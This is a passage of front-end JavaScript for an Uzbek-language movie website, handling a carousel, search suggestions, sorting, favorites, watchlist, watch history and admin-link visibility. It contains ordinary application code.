      </div>
    `;
    
    elements.carouselTrack.appendChild(slide);
    const watchBtn = slide.querySelector('.watch-btn');
if (watchBtn) {
  watchBtn.addEventListener('click', (e) => {
    e.stopPropagation(); // Karusel click eventini to'xtatadi
    // Tanlangan film ID sini localStorage ga saqlash
    localStorage.setItem('selectedMovieId', m.id);
    // singlepage.html sahifasiga yo'naltirish
    window.location.href = 'singlepage.html';
  });
}

    if (!isMobile && elements.carouselDots) {
      const dot = document.createElement('button');
      dot.type = 'button';
      dot.className = i === 0 ? 'active' : '';
      dot.addEventListener('click', () => goToSlide(i));
      elements.carouselDots.appendChild(dot);
    }
  });
  // Lazy load slide backgrounds
  const slidesBg = elements.carouselTrack.querySelectorAll('.slide-bg');
  const io = new IntersectionObserver((entries, obs) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const el = entry.target;
        const url = el.getAttribute('data-bg');
        if (url) {
          el.style.backgroundImage = `url('${url}')`;
          el.removeAttribute('data-bg');
        }
        obs.unobserve(el);
      }
    });
  }, { rootMargin: '200px' });
  slidesBg.forEach(el => io.observe(el));

  if (!isMobile) startCarouselAutoplay();
  // Hide nav buttons on mobile
  if (elements.carouselPrev) elements.carouselPrev.style.display = isMobile ? 'none' : '';
  if (elements.carouselNext) elements.carouselNext.style.display = isMobile ? 'none' : '';
}

function goToSlide(idx) {
  // Indeksni to'g'ri chegaralash
  if (idx < 0) idx = state.carouselItems.length - 1;
  if (idx >= state.carouselItems.length) idx = 0;
  
  state.currentSlide = idx;
  const slides = document.querySelectorAll('.carousel-slide');
  
  // Har bir slaydni yangi pozitsiyaga joylashtirish
  slides.forEach((slide, i) => {
    const position = calculateSlidePosition(i, idx);
    slide.style.left = position.left;
    slide.style.zIndex = position.zIndex;
    slide.style.transform = `scale(${position.scale})`;
    slide.style.opacity = position.opacity;
    
    // Filter stilini qo'shish
    if (position.filter) {
      slide.style.filter = position.filter;
    }
    
    // Center klassini faqat markazdagi slaydga qo'shish
    slide.classList.toggle('center', i === idx);
  });
  
  if (elements.carouselDots) {
    const dots = elements.carouselDots.querySelectorAll('button');
    dots.forEach((d, i) => d.classList.toggle('active', i === idx));
  }
  
  resetCarouselAutoplay();
}

function navigateCarousel(dir) {
  if (!state.carouselItems.length) return;
  const newIndex = (state.currentSlide + dir + state.carouselItems.length) % state.carouselItems.length;
  goToSlide(newIndex);
}

function startCarouselAutoplay() {
  clearInterval(state.carouselInterval);
  // Avtomatik o'ynash intervalini 3 sekundga o'rnatish
  const autoplayInterval = 3000; // 3 sekund
  
  if (window.innerWidth <= 768) return; // mobile: disable autoplay
  state.carouselInterval = setInterval(() => {
    if ((!elements.carouselAutoplay || elements.carouselAutoplay.checked) && state.carouselItems && state.carouselItems.length > 0) {
      navigateCarousel(1); // Har doim o'ngga harakatlanish
    }
  }, autoplayInterval);
}

function resetCarouselAutoplay() {
  clearInterval(state.carouselInterval);
  startCarouselAutoplay();
}

function toggleCarouselAutoplay() {
  if (elements.carouselAutoplay && elements.carouselAutoplay.checked) {
    startCarouselAutoplay();
  } else {
    clearInterval(state.carouselInterval);
  }
}

// UI Event Handlers
function setLoading(val) {
  state.isLoading = val;
  // Button state
  if (elements.loadMoreBtn) {
    if (val) {
      elements.loadMoreBtn.disabled = true;
      elements.loadMoreBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Yuklanmoqda...';
    } else {
      elements.loadMoreBtn.disabled = false;
      elements.loadMoreBtn.innerHTML = '<i class="fas fa-plus"></i> Ko\'proq yuklash';
    }
  }
  // Render skeletons if starting to load and grid is empty
  if (val && elements.moviesGrid && elements.moviesGrid.children.length === 0) {
    renderSkeletons();
  }
}

function handleSearch(e) {
  e && e.preventDefault();
  const q = elements.searchInput ? elements.searchInput.value.trim() : '';
  state.currentSearchQuery = q;
  state.currentFilter = 'search';
  if (q) {
    searchMovies(q);
  } else {
    fetchMovies('popular');
  }
}

// Live suggestions (debounced) with token-based matching
let suggestTimer = null;
async function handleSearchInput(){
  if (!elements.searchInput || !elements.searchSuggestions) return;
  const q = elements.searchInput.value.trim();
  clearTimeout(suggestTimer);
  if (!q) { hideSuggestions(); return; }
  suggestTimer = setTimeout(async () => {
    const list = await getSuggestionResults(q);
    renderSuggestions(list.slice(0,8));
  }, 180);
}

function hideSuggestions(){
  if (elements.searchSuggestions) {
    elements.searchSuggestions.innerHTML = '';
    elements.searchSuggestions.hidden = true;
  }
}

async function getSuggestionResults(query){
  const tokens = query.toLowerCase().split(/\s+/).filter(Boolean);
  if (!tokens.length) return [];
  const local = await loadMoviesFromJSON();
  if (local.length){
    return local.filter(m => {
      const title = (getTitle(m) || '').toLowerCase();
      const desc = (getDescription(m) || '').toLowerCase();
      const extra = [(m.year||''), ...(Array.isArray(m.genres)?m.genres:[]), (m.type||'')].join(' ').toLowerCase();
      const hay = title + ' ' + desc + ' ' + extra;
      return tokens.every(t => hay.includes(t));
    });
  }
  try {
    const res = await fetch(`${CONFIG.apiUrl}/search/movie?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&region=${CONFIG.defaultRegion}&query=${encodeURIComponent(query)}&page=1`);
    const data = await res.json();
    return data.results || [];
  } catch { return []; }
}

function renderSuggestions(list){
  const box = elements.searchSuggestions;
  if (!box) return;
  box.innerHTML = '';
  if (!list.length){ box.hidden = true; return; }
  list.forEach(m => {
    const id = Number(m.id);
    const title = getTitle(m);
    const year = getYear(m);
    const rating = getRating(m);
    const poster = getPosterUrl(m);
    const item = document.createElement('div');
    item.className = 'item';
    item.innerHTML = `
      <div class="thumb"><img src="${poster}" alt="${title}"></div>
      <div class="text">
        <div class="title">${title}</div>
        <div class="meta">${year} • ⭐ ${rating}</div>
      </div>`;
    item.addEventListener('click', () => {
      try { localStorage.setItem('selectedMovieId', String(id)); } catch {}
      window.location.href = 'singlepage.html';
    });
    box.appendChild(item);
  });
  box.hidden = false;
}

function handleSortChange(e) {
  const val = e ? e.target.value : '';
  const moviesArr = [...state.currentMovies];
  if (val === 'latest') {
    moviesArr.sort((a, b) => (new Date(b.releaseDate || b.release_date || (b.year || 0))) - (new Date(a.releaseDate || a.release_date || (a.year || 0))));
  } else if (val === 'rating') {
    moviesArr.sort((a, b) => (b.averageRating || b.vote_average || 0) - (a.averageRating || a.vote_average || 0));
  }
  renderMovies(moviesArr);
}

async function loadMoreMovies() {
  if (state.isLoading) return;
  const nextPage = state.currentPage + 1;
  if (state.currentSearchQuery) await searchMovies(state.currentSearchQuery, nextPage);
  else if (state.currentGenreId) await fetchMoviesByGenre(state.currentGenreId, nextPage);
  else await fetchMovies(state.currentFilter, nextPage);
  state.currentPage = nextPage;
}

function handleNavLinkClick(e) {
  e.preventDefault();
  const filter = e.currentTarget.dataset.filter;
  document.querySelectorAll('.main-nav .nav-link').forEach(n => n.classList.remove('active'));
  e.currentTarget.classList.add('active');
  state.currentFilter = filter;
  state.currentGenreId = null;
  state.currentSearchQuery = '';
  if (elements.searchInput) elements.searchInput.value = '';
  if (elements.sortSelect) elements.sortSelect.value = 'popular';
  if (elements.moviesSectionTitle) {
    if (filter === 'all_500') elements.moviesSectionTitle.textContent = '500 ta film';
    else if (filter === 'top_rated') elements.moviesSectionTitle.textContent = 'Top 10 kinolar';
    else elements.moviesSectionTitle.textContent = filter === 'popular' ? 'Popular Filmlar' : 'Filmlar';
  }
  // Hide/Show Load More for special filters
  if (elements.loadMoreBtn) {
    const disable = filter === 'all_500' || filter === 'top_rated';
    elements.loadMoreBtn.disabled = disable;
    elements.loadMoreBtn.style.display = disable ? 'none' : '';
  }
  if (filter === 'all_500') {
    fetchAllPopular(500);
  } else if (filter === 'top_rated') {
    fetchTopRatedTop10();
  } else {
    fetchMovies(filter);
  }
  
  // Scroll to movies section
  const moviesSection = document.querySelector('.movies-grid');
  if (moviesSection) {
    setTimeout(() => {
      moviesSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }, 500);
  }
}

function handleCategoryCardClick(e) {
  const card = e.currentTarget;
  const genreId = card.dataset.genreId;
  const category = card.dataset.category;
  const title = card.querySelector('h3')?.textContent || 'Filmlar';
  document.querySelectorAll('.main-nav .nav-link').forEach(n => n.classList.remove('active'));
  state.currentSearchQuery = '';
  if (elements.searchInput) elements.searchInput.value = '';
  if (elements.sortSelect) elements.sortSelect.value = 'popular';

  if (genreId) {
    state.currentFilter = 'genre';
    state.currentGenreId = genreId;
    state.currentCategory = null;
    if (elements.moviesSectionTitle) elements.moviesSectionTitle.textContent = `${title} filmlar`;
    fetchMoviesByGenre(genreId);
  } else if (category) {
    state.currentFilter = 'category';
    state.currentGenreId = null;
    state.currentCategory = category;
    if (elements.moviesSectionTitle) elements.moviesSectionTitle.textContent = `${title} filmlar`;
    fetchMovies();
  }
}

// Filter movies by category
function filterByCategory(category) {
  state.currentCategory = category;
  state.currentFilter = 'category';
  state.currentSearchQuery = '';
  state.currentGenreId = null;
  state.currentPage = 1;
  
  if (elements.moviesSectionTitle) {
    elements.moviesSectionTitle.textContent = `${category} filmlar`;
  }
  fetchMovies();
}

function toggleMobileMenu() {
  if (elements.mainNav) elements.mainNav.classList.toggle('active');
  if (elements.mobileMenuToggle) elements.mobileMenuToggle.classList.toggle('active');
}

function toggleFavoritesView() {
  const isPressed = elements.favoritesToggle && elements.favoritesToggle.getAttribute('aria-pressed') === 'true';
  if (!isPressed) {
    elements.favoritesToggle.setAttribute('aria-pressed', 'true');
    elements.favoritesToggle.innerHTML = '<i class="fas fa-times"></i>';
    if (elements.moviesSectionTitle) elements.moviesSectionTitle.textContent = 'Sevimlilar';
    showFavorites();
  } else {
    elements.favoritesToggle.setAttribute('aria-pressed', 'false');
    elements.favoritesToggle.innerHTML = '<i class="fas fa-heart"></i>';
    if (elements.moviesSectionTitle) elements.moviesSectionTitle.textContent = 'Popular Filmlar';
    fetchMovies('popular');
  }
}

function toggleWatchlistView() {
  const isPressed = elements.watchlistToggle && elements.watchlistToggle.getAttribute('aria-pressed') === 'true';
  if (!isPressed) {
    elements.watchlistToggle.setAttribute('aria-pressed', 'true');
    if (elements.watchlistToggle) elements.watchlistToggle.innerHTML = '<i class="fas fa-times"></i>';
    if (elements.moviesSectionTitle) elements.moviesSectionTitle.textContent = 'Watchlist';
    showWatchlist();
  } else {
    elements.watchlistToggle.setAttribute('aria-pressed', 'false');
    if (elements.watchlistToggle) elements.watchlistToggle.innerHTML = '<i class="fas fa-bookmark"></i>';
    if (elements.moviesSectionTitle) elements.moviesSectionTitle.textContent = 'Popular Filmlar';
    fetchMovies('popular');
  }
}

// Show watch history view
async function showHistory() {
  try {
    const raw = JSON.parse(localStorage.getItem('watch_history') || '[]');
    const ids = Array.isArray(raw) ? raw.map(x => Number(x.id)) : [];
    if (!ids.length) {
      renderMovies([]);
      toggleEmptyState(true);
      return;
    }
    const json = await loadMoviesFromJSON();
    let movies = [];
    if (json.length) {
      const byId = new Map(json.map(m => [Number(m.id), m]));
      movies = ids.map(id => byId.get(id)).filter(Boolean);
    } else {
      // Fallback to API fetch by id
      movies = await Promise.all(ids.map(async id => {
        try {
          const res = await fetch(`${CONFIG.apiUrl}/movie/${id}?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}`);
          if (!res.ok) return null;
          return await res.json();
        } catch { return null; }
      }));
      movies = movies.filter(Boolean);
    }
    renderMovies(movies);
    toggleEmptyState(movies.length === 0);
  } catch {
    renderMovies([]);
    toggleEmptyState(true);
  }
}

// Setup event listeners
function setupEventListeners() {
  if (elements.searchForm) elements.searchForm.addEventListener('submit', handleSearch);
  if (elements.searchInput) {
    elements.searchInput.addEventListener('input', handleSearchInput);
    elements.searchInput.addEventListener('focus', handleSearchInput);
  }
  document.addEventListener('click', (e)=>{
    if (!elements.searchSuggestions) return;
    const within = e.target === elements.searchSuggestions || elements.searchSuggestions.contains(e.target) || e.target === elements.searchInput;
    if (!within) hideSuggestions();
  });
  if (elements.loadMoreBtn) elements.loadMoreBtn.addEventListener('click', loadMoreMovies);
  if (elements.sortSelect) elements.sortSelect.addEventListener('change', handleSortChange);
  if (elements.modalClose) elements.modalClose.addEventListener('click', closeModal);
  if (elements.movieModal) {
    elements.movieModal.addEventListener('click', e => { if (e.target === elements.movieModal) closeModal(); });
  }
  if (elements.modalFavBtn) elements.modalFavBtn.addEventListener('click', toggleFavoriteFromModal);
  if (elements.favoritesToggle) elements.favoritesToggle.addEventListener('click', toggleFavoritesView);
  if (elements.watchlistToggle) elements.watchlistToggle.addEventListener('click', toggleWatchlistView);
  if (elements.carouselPrev) elements.carouselPrev.addEventListener('click', () => navigateCarousel(-1));
  if (elements.carouselNext) elements.carouselNext.addEventListener('click', () => navigateCarousel(1));
  if (elements.carouselAutoplay) elements.carouselAutoplay.addEventListener('change', toggleCarouselAutoplay);
  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
  if (elements.reviewForm) elements.reviewForm.addEventListener('submit', handleAddReview);
  if (elements.trailerClose) elements.trailerClose.addEventListener('click', closeTrailerModal);
  if (elements.trailerModal) elements.trailerModal.addEventListener('click', (e) => { if (e.target === elements.trailerModal) closeTrailerModal(); });
  if (elements.navLinks) {
    elements.navLinks.forEach(link => link.addEventListener('click', handleNavLinkClick));
  }
  if (elements.categoryCards) {
    elements.categoryCards.forEach(card => card.addEventListener('click', handleCategoryCardClick));
  }
  if (elements.mobileMenuToggle) {
    elements.mobileMenuToggle.addEventListener('click', toggleMobileMenu);
  }

  // Footer actions
  if (elements.footerFavorites) {
    elements.footerFavorites.addEventListener('click', (e) => {
      e.preventDefault();
      if (elements.moviesSectionTitle) elements.moviesSectionTitle.textContent = 'Sevimlilar';
      elements.favoritesToggle?.setAttribute('aria-pressed', 'true');
      elements.favoritesToggle && (elements.favoritesToggle.innerHTML = '<i class="fas fa-times"></i>');
      showFavorites();
      document.getElementById('moviesSection')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
    });
  }
  if (elements.footerHistory) {
    elements.footerHistory.addEventListener('click', (e) => {
      e.preventDefault();
      state.currentFilter = 'history';
      state.currentGenreId = null;
      state.currentSearchQuery = '';
      if (elements.sortSelect) elements.sortSelect.value = 'popular';
      if (elements.moviesSectionTitle) elements.moviesSectionTitle.textContent = 'Ko\'rish tarixi';
      showHistory();
      document.getElementById('moviesSection')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
    });
  }
  // Placeholders for profile/settings/FAQ/support
  const placeholder = (name) => (e) => { e.preventDefault(); alert(name + ' tez orada qo\'shiladi.'); };
  if (elements.footerProfile) elements.footerProfile.addEventListener('click', placeholder('Profil'));
  if (elements.footerSettings) elements.footerSettings.addEventListener('click', placeholder('Sozlamalar'));
  if (elements.footerFAQ) elements.footerFAQ.addEventListener('click', placeholder('FAQ'));
  if (elements.footerSupport) elements.footerSupport.addEventListener('click', placeholder('Qo\'llab-quvvatlash'));

  // Carousel prev/next buttons (desktop only; hidden on mobile via CSS)
  if (elements.carouselPrev) {
    elements.carouselPrev.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      navigateCarousel(-1);
    });
  }
  if (elements.carouselNext) {
    elements.carouselNext.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      navigateCarousel(1);
    });
  }

  // Carousel touch swipe
  if (elements.carouselTrack) {
    let startX = 0;
    elements.carouselTrack.addEventListener('touchstart', e => {
      startX = e.changedTouches[0].screenX;
    }, { passive: true });
    elements.carouselTrack.addEventListener('touchend', e => {
      const endX = e.changedTouches[0].screenX;
      if (endX < startX - 50) navigateCarousel(1);
      if (endX > startX + 50) navigateCarousel(-1);
    }, { passive: true });
  }
}

// Yuklash animatsiyasini boshqarish
function hideLoader() {
  const loader = document.getElementById('loader');
  if (loader) {
    loader.classList.add('loader-hidden');
    setTimeout(() => {
      loader.style.display = 'none';
    }, 500);
  }
}

// Init
document.addEventListener('DOMContentLoaded', async () => {
  // Yuklash animatsiyasini ko'rsatish
  setTimeout(() => {
    hideLoader();
  }, 1500);
  
  setupEventListeners();
  // Force favorites toggle to default (off)
  if (elements.favoritesToggle) {
    elements.favoritesToggle.setAttribute('aria-pressed','false');
    elements.favoritesToggle.innerHTML = '<i class="fas fa-heart"></i>';
  }
  if (elements.watchlistToggle) {
    elements.watchlistToggle.setAttribute('aria-pressed','false');
    elements.watchlistToggle.innerHTML = '<i class="fas fa-bookmark"></i>';
  }
  // Unify initial data load with the same path used by navbar and toggle
  try {
    await fetchMovies('popular');
  } catch (e) {
    console.error('Init load failed:', e);
    // As last resort, attempt aggregated popular load
    await fetchAllPopular(20);
  }
  
  // Category cards listeners are set in setupEventListeners()
  // Admin havolasini faqat admin foydalanuvchilar uchun ko'rsatish
  try {
    const adminLink = document.getElementById('adminLink');
    if (adminLink && window.firebase && firebase.auth && firebase.firestore) {
      const auth = firebase.auth();
      const db = firebase.firestore();
      auth.onAuthStateChanged(async (user) => {
        try {
          if (!user) { adminLink.style.display = 'none'; return; }
          const doc = await db.collection('users').doc(user.uid).get();
          const data = doc.exists ? doc.data() : null;
          const isAdmin = !!(data && data.isAdmin === true);
          adminLink.style.display = isAdmin ? '' : 'none';
          adminLink.title = isAdmin ? 'Admin panel' : '';
        } catch {
          adminLink.style.display = 'none';
        }
      });
    }
    // Also allow local/basic-admin sessions to see the Admin link
    const updateAdminLinkLocal = () => {
      const adminLink2 = document.getElementById('adminLink');
      if (!adminLink2) return;
      try {
        const basicAdmin = sessionStorage.getItem('basicAdmin') === 'true';
        const localUser = JSON.parse(localStorage.getItem('local_user') || 'null');
        const adminUsers = JSON.parse(localStorage.getItem('admin_users') || '[]');
        // Now show Admin link for ANY signed local user as requested
        const isLocalAdmin = !!(basicAdmin || localUser || (adminUsers && adminUsers.length > 0));
        if (isLocalAdmin) {
          adminLink2.style.display = '';
          adminLink2.title = 'Admin panel (lokal)';
        } else if (!(window.firebase && firebase.auth && firebase.firestore)) {
          // If Firebase not available, hide by default unless local admin
          adminLink2.style.display = 'none';
        }
      } catch {}
    };
    updateAdminLinkLocal();
    window.addEventListener('storage', (e) => {
      if (['basicAdmin','local_user','admin_users'].includes(e.key)) updateAdminLinkLocal();
    });
  } catch {}
});
